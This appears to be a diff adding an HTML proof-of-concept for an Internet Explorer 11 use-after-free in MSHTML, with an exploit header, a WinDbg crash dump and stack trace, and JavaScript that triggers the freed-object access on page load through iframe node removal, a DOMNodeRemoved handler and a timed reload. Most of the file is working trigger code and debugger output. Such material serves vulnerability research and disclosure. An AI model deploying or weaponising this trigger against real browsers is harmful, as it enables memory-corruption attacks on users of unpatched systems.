@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Expires" content="0" />
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+  <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <style type="text/css">
+   body{
+        background-color:lime;
+        font-color:red;
+   };
+  </style>
+  <script type='text/javascript'></script> 
+  <script type="text/javascript" language="JavaScript">
+  /*
+    # Exploit Title: Internet Explorer 11 Use After Free
+	# Date: 05/09/2016 - 11/09/2016
+	# Exploit Author: Marcin Ressel
+    # Vendor Homepage: https://www.microsoft.com/pl-pl/
+	# Version: 11.0.9600.18482
+	# Tested on: Windows 7 (x64)
+	
+	######################################################################################
+	
+     0:014> g
+     (13a8.9b8): Access violation - code c0000005 (!!! second chance !!!)
+      eax=2f66abb0 ebx=00000001 ecx=2fbc8f08 edx=7ef8d000 esi=2fbc8f08 edi=2fbc8f08
+      eip=6d754a45 esp=1feac660 ebp=1feac674 iopl=0         nv up ei pl nz na po nc
+      cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+      MSHTML!CElement::SecurityContext+0x25:
+      6d754a45 8b80b8000000    mov     eax,dword ptr [eax+0B8h] ds:002b:2f66ac68=????????
+      0:014> d @eax
+      2f66abb0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66abc0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66abd0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66abe0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66abf0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66ac00  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66ac10  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      2f66ac20  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+      0:014> kb
+      ChildEBP RetAddr  Args to Child              
+      1feac660 6d5e7c69 6d5e7500 1feac690 2fbc8f08 MSHTML!CElement::SecurityContext+0x25
+      1feac674 6d5e75cf 2fbc8f08 2fbc8f08 2fbc8f08 MSHTML!CMediaElement::RemoveFromPlayToElementTracker+0x1d
+      1feac688 6d5e7bee 1feac6a0 6d5e7bd0 00000004 MSHTML!CMediaElement::Shutdown+0xdc
+      1feac698 6d5e7b1c 48cfae30 50d00bb0 4542dbd0 MSHTML!CMediaElement::OnMarkupTearDown+0x1e
+      1feac6c4 6d3b23dc 00000000 4542dbd0 50d00bb0 MSHTML!CMarkup::InvokeMarkupTearDownCallbacks+0xc0
+      1feac6d8 6d3b22c9 00000001 00000001 341a8bb0 MSHTML!CMarkup::TearDownMarkupHelper+0xe4
+      1feac700 6d3adf1f 00000001 00000001 1feac7d0 MSHTML!CMarkup::TearDownMarkup+0x58
+      1feac7b0 6dae9665 341a8bb0 00000000 00000000 MSHTML!COmWindowProxy::SwitchMarkup+0x4eb
+      1feac894 6dae97e3 00005004 ffffffff 00000000 MSHTML!COmWindowProxy::ExecRefresh+0xa1c
+      1feac8a8 6d0d763b 457f1f68 00005004 00000001 MSHTML!COmWindowProxy::ExecRefreshCallback+0x23
+      1feac8f0 6d0cd4e2 91c55b56 00000000 6d0cc800 MSHTML!GlobalWndOnMethodCall+0x17b
+      1feac944 76b862fa 001401c6 00008002 00000000 MSHTML!GlobalWndProc+0x103
+      1feac970 76b86d3a 6d0cc800 001401c6 00008002 user32!InternalCallWinProc+0x23
+      1feac9e8 76b877d3 00000000 6d0cc800 001401c6 user32!UserCallWinProcCheckWow+0x109
+      1feaca4c 76b8789a 6d0cc800 00000000 1feafc28 user32!DispatchMessageWorker+0x3cb
+      1feaca5c 6e5fa8ac 1feaca9c 62382e48 2efb2fe0 user32!DispatchMessageW+0xf
+      1feafc28 6e620e88 1feafcf4 6e620b00 5cba2ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+      1feafce8 74e4ad3c 62382e48 1feafd0c 6e614b00 IEFRAME!LCIETab_ThreadProc+0x3e7
+      1feafd00 6e593a31 5cba2ff0 00000000 6e5939a0 iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1c
+      1feafd38 6fae9608 4b3b6fe8 705e0368 00000000 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x94
+	  
+	  ############################################################################################
+  */
+  
+			var doc;
+			var trg, trg_parent;		
+			function testcase()
+			{
+			    var e1_frame = document.getElementById("e1"); 
+				doc = document; 
+				
+				e = e1_frame.contentWindow.document.createElement("hr"); 
+				rf = doc.body.appendChild(e); 
+				
+				e = e1_frame.contentWindow.document.createElement("audio"); 
+				rf = doc.body.appendChild(e); 
+				
+				dom = doc.getElementsByTagName("*");
+				document.getElementById("e1").removeNode(true); 
+				trg = dom[14]; 
+				trg_parent = doc.body; 
+
+				trg.addEventListener('DOMNodeRemoved',
+				                     new Function('',
+									              //'try{trg.removeEventListener("DOMNodeRemoved",this,false);}catch(e){}'+
+												  'try{trg.appendChild(document.createElement("feOffset")).removeNode(false).ATTRIBUTE_NODE = "false";}catch(e){}'+
+												  'try{trg_parent = trg.cloneNode(true);}catch(e){}'//+
+												//  'try{doc = document.implementation.createDocument("about:blank","","text/html");}catch(e){}'
+												 ),
+									false);
+				trg_parent.innerHTML = trg.innerHTML; 
+			    //CollectGarbage();
+				//trg.innerHTML = "<h1></h1>"
+				setTimeout('location.reload();',700);
+			}
+		</script>
+  <title>Use After Free</title>
+  </head>
+  <body onload='testcase();'>
+   <iframe></iframe><iframe src='about:blank' id='e1'></iframe>
+  </body>
+</html>
+</html>
